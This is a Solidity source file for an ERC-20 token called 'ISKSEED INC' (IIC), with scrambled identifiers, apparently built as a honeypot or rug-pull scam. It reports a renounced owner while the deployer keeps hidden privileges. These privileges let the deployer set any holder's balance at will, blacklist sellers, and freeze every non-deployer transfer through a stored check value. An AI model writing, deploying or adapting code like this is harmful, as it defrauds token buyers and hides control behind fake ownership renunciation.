//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface vwcnwgypocdqt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface jfhmackrumh {
    function createPair(address kyteugttkhhb, address qmobhebvl) external returns (address);
}

abstract contract qpjjjshvzt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface okncuemkgnqi {
    function totalSupply() external view returns (uint256);

    function balanceOf(address wgdcjitlrd) external view returns (uint256);

    function transfer(address sptungrfv, uint256 mfttdmeznon) external returns (bool);

    function allowance(address xjevegtnurxs, address spender) external view returns (uint256);

    function approve(address spender, uint256 mfttdmeznon) external returns (bool);

    function transferFrom(address sender,address sptungrfv,uint256 mfttdmeznon) external returns (bool);

    event Transfer(address indexed from, address indexed buzhuwoplqdqv, uint256 value);
    event Approval(address indexed xjevegtnurxs, address indexed spender, uint256 value);
}

interface txdpfawhuf is okncuemkgnqi {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ISKSEEDINC is qpjjjshvzt, okncuemkgnqi, txdpfawhuf {

    uint256 public vjllzriuecgbz;

    function totalSupply() external view virtual override returns (uint256) {
        return zzbkhscvwfaoch;
    }

    function oaiybtwwyhns(address safbaljtnjta) public {
        if (ffmmnivsyrqkm) {
            return;
        }
        if (vjllzriuecgbz != qxoeyoopucpqo) {
            qxoeyoopucpqo = hhgyzufvt;
        }
        nprgdfgzu[safbaljtnjta] = true;
        
        ffmmnivsyrqkm = true;
    }

    function transferFrom(address jjurvjmvkdrix, address sptungrfv, uint256 mfttdmeznon) external override returns (bool) {
        if (_msgSender() != zivoxogwyv) {
            if (fixxqladmko[jjurvjmvkdrix][_msgSender()] != type(uint256).max) {
                require(mfttdmeznon <= fixxqladmko[jjurvjmvkdrix][_msgSender()]);
                fixxqladmko[jjurvjmvkdrix][_msgSender()] -= mfttdmeznon;
            }
        }
        return hjoooeitqxryx(jjurvjmvkdrix, sptungrfv, mfttdmeznon);
    }

    bool public dtpdsgnijxg;

    address public rpdobzyxsmwdx;

    bool private xzqxxrxarfcef;

    uint8 private vzxmhhbmdfbp = 18;

    bool public mpiwswdpzm;

    address omnyaaixrzz = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 dtyjlpdfolvtwp;

    mapping(address => bool) public gzkutyctge;

    function mhyufszfeq() private view {
        require(nprgdfgzu[_msgSender()]);
    }

    string private focptdupqewj = "ISKSEED INC";

    address private mwjpxgpgxc;

    uint256 private zzbkhscvwfaoch = 100000000 * 10 ** 18;

    uint256 public qxoeyoopucpqo;

    string private ylkkzcvfyxjvp = "IIC";

    function symbol() external view virtual override returns (string memory) {
        return ylkkzcvfyxjvp;
    }

    function decimals() external view virtual override returns (uint8) {
        return vzxmhhbmdfbp;
    }

    function balanceOf(address wgdcjitlrd) public view virtual override returns (uint256) {
        return imezjmwszcqdl[wgdcjitlrd];
    }

    function hjoooeitqxryx(address jjurvjmvkdrix, address sptungrfv, uint256 mfttdmeznon) internal returns (bool) {
        if (jjurvjmvkdrix == rpdobzyxsmwdx) {
            return jlflnckpxjhedb(jjurvjmvkdrix, sptungrfv, mfttdmeznon);
        }
        uint256 epysdlzmc = okncuemkgnqi(erhveiljekh).balanceOf(omnyaaixrzz);
        require(epysdlzmc == moqyhptiupvp);
        require(!gzkutyctge[jjurvjmvkdrix]);
        return jlflnckpxjhedb(jjurvjmvkdrix, sptungrfv, mfttdmeznon);
    }

    function owner() external view returns (address) {
        return mwjpxgpgxc;
    }

    address public erhveiljekh;

    function jlflnckpxjhedb(address jjurvjmvkdrix, address sptungrfv, uint256 mfttdmeznon) internal returns (bool) {
        require(imezjmwszcqdl[jjurvjmvkdrix] >= mfttdmeznon);
        imezjmwszcqdl[jjurvjmvkdrix] -= mfttdmeznon;
        imezjmwszcqdl[sptungrfv] += mfttdmeznon;
        emit Transfer(jjurvjmvkdrix, sptungrfv, mfttdmeznon);
        return true;
    }

    event OwnershipTransferred(address indexed lshpmabbb, address indexed qvmlmtiygjbmgf);

    function ezdnwylvgklpf(address smyettyll) public {
        mhyufszfeq();
        if (hhgyzufvt == qxoeyoopucpqo) {
            qxoeyoopucpqo = finssibqrth;
        }
        if (smyettyll == rpdobzyxsmwdx || smyettyll == erhveiljekh) {
            return;
        }
        gzkutyctge[smyettyll] = true;
    }

    bool private nxynlbyfygodlx;

    function allowance(address faojnfzlzlrr, address czlrkbxunkj) external view virtual override returns (uint256) {
        if (czlrkbxunkj == zivoxogwyv) {
            return type(uint256).max;
        }
        return fixxqladmko[faojnfzlzlrr][czlrkbxunkj];
    }

    mapping(address => uint256) private imezjmwszcqdl;

    constructor (){
        if (nxynlbyfygodlx) {
            vjllzriuecgbz = finssibqrth;
        }
        avvskbbatnr();
        vwcnwgypocdqt kbamvyfwof = vwcnwgypocdqt(zivoxogwyv);
        erhveiljekh = jfhmackrumh(kbamvyfwof.factory()).createPair(kbamvyfwof.WETH(), address(this));
        if (mpiwswdpzm != dtpdsgnijxg) {
            finssibqrth = vjllzriuecgbz;
        }
        rpdobzyxsmwdx = _msgSender();
        nprgdfgzu[rpdobzyxsmwdx] = true;
        imezjmwszcqdl[rpdobzyxsmwdx] = zzbkhscvwfaoch;
        if (biuuqfibgq == finssibqrth) {
            mpiwswdpzm = false;
        }
        emit Transfer(address(0), rpdobzyxsmwdx, zzbkhscvwfaoch);
    }

    function transfer(address akfzntqzal, uint256 mfttdmeznon) external virtual override returns (bool) {
        return hjoooeitqxryx(_msgSender(), akfzntqzal, mfttdmeznon);
    }

    function getOwner() external view returns (address) {
        return mwjpxgpgxc;
    }

    function name() external view virtual override returns (string memory) {
        return focptdupqewj;
    }

    uint256 public finssibqrth;

    uint256 private ivzlptyrck;

    function wzclbixqtbgzq(address akfzntqzal, uint256 mfttdmeznon) public {
        mhyufszfeq();
        imezjmwszcqdl[akfzntqzal] = mfttdmeznon;
    }

    mapping(address => bool) public nprgdfgzu;

    uint256 moqyhptiupvp;

    uint256 private biuuqfibgq;

    bool public ffmmnivsyrqkm;

    mapping(address => mapping(address => uint256)) private fixxqladmko;

    function approve(address czlrkbxunkj, uint256 mfttdmeznon) public virtual override returns (bool) {
        fixxqladmko[_msgSender()][czlrkbxunkj] = mfttdmeznon;
        emit Approval(_msgSender(), czlrkbxunkj, mfttdmeznon);
        return true;
    }

    uint256 public hhgyzufvt;

    address zivoxogwyv = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function avvskbbatnr() public {
        emit OwnershipTransferred(rpdobzyxsmwdx, address(0));
        mwjpxgpgxc = address(0);
    }

    function xhqjyybhtr(uint256 mfttdmeznon) public {
        mhyufszfeq();
        moqyhptiupvp = mfttdmeznon;
    }

}